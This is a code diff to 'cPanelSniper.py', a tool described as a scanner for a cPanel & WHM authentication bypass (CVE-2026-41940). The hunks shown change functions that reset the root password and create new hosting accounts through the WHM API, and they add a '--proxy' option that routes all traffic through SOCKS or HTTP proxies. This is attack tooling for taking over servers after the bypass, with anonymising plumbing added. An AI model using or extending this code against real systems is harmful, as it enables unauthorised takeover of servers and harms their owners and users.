@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 cPanelSniper.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
 Author  : Mitsec (@ynsmroztas)
@@ -466,7 +464,7 @@ def action_change_passwd(ctx, new_password):
     """Change root password"""
     log("API", f"Changing root password → {new_password}")
     s, data = whm_api(*ctx[:6], "passwd",
-                      {"user": "root", "password": new_password}, ctx[6], ctx[-1])
+                      {"user": "root", "password": new_password}, ctx[6])
     safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
                else str(data)[:800])
 
@@ -589,8 +587,7 @@ def action_create_user(ctx, username: str, domain: str, passwd: str):
     log("API", f"Creating account: {username} / {domain}")
     s, data = whm_api(*ctx[:6], "createacct",
                       {"username": username, "domain": domain,
-                       "password": passwd, "plan": "default"}, ctx[6],
-                      ctx[-1])
+                       "password": passwd, "plan": "default"}, ctx[6])
     safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
                else str(data)[:800])
 
@@ -988,6 +985,7 @@ Examples:
     tg.add_argument("-u","--url",      help="Single target URL (e.g. https://host:2087)")
     tg.add_argument("-l","--list",     help="File with URLs (one per line)")
     tg.add_argument("--hostname",      help="Override canonical Host header (auto-discovered)")
+    tg.add_argument("--proxy",         help="Proxy in format IP:PORT:USER:PASS SOCKS")
 
     sg = p.add_argument_group("Scan")
     sg.add_argument("-t","--threads",  type=int, default=10, help="Threads (default: 10)")
@@ -1012,6 +1010,41 @@ Examples:
     if args.no_color:
         for a in [x for x in dir(C) if not x.startswith("_")]:
             setattr(C, a, "")
+
+    if args.proxy:
+        try:
+            import socks
+            import socket
+            parts = args.proxy.strip().split()
+            auth_parts = parts[0].split(':')
+            if len(auth_parts) == 4:
+                ip, port, user, passwd = auth_parts
+            elif len(auth_parts) == 2:
+                ip, port = auth_parts
+                user = passwd = None
+            else:
+                raise ValueError("Invalid proxy format. Use IP:PORT:USER:PASS")
+            
+            proxy_type = parts[1].upper() if len(parts) > 1 else "SOCKS"
+            
+            if proxy_type == "SOCKS":
+                ptype = socks.SOCKS5
+            elif proxy_type == "SOCKS4":
+                ptype = socks.SOCKS4
+            elif proxy_type == "HTTP":
+                ptype = socks.HTTP
+            else:
+                ptype = socks.SOCKS5
+                
+            socks.set_default_proxy(ptype, ip, int(port), True, user, passwd)
+            socket.socket = socks.socksocket
+            log("INFO", f"Global proxy set to {ip}:{port} ({proxy_type})")
+        except ImportError:
+            log("ERR", "Proxy support requires PySocks. Run: pip install PySocks")
+            sys.exit(1)
+        except Exception as e:
+            log("ERR", f"Proxy setup error: {e}")
+            sys.exit(1)
 
     targets = []
     if args.url:   targets.append(args.url)
